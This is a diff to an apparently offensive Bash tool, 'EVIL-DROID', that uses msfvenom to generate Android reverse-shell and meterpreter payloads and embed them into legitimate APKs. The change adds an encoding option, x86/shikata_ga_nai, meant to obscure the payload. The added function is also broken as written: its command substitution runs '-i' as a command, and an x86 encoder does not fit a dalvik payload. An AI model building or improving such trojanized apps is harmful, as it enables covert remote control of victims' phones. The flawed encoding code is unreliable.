@@ -265,6 +265,13 @@ function get_payload1()
 {
   PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
 }
+
+#Set Encoding
+function encode()
+{
+  ENCODE=$(-i 100 -e x86/shikata_ga_nai -b "\x00" )
+}
+
 #function name
 function payload_name()
 {
@@ -286,14 +293,14 @@ function gen_payload()
  echo -e $yellow ""
  echo "[*] Generating apk payload"
  spinlong
- xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+ xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT $ENCODE -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 function embed_payload()
 {
  echo -e $yellow ""
  echo "[*] Embeding apk payload in orginal apk"
  spinlong
- xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+ xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT $ENCODE -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 #function update apktool
 function up_apktook()
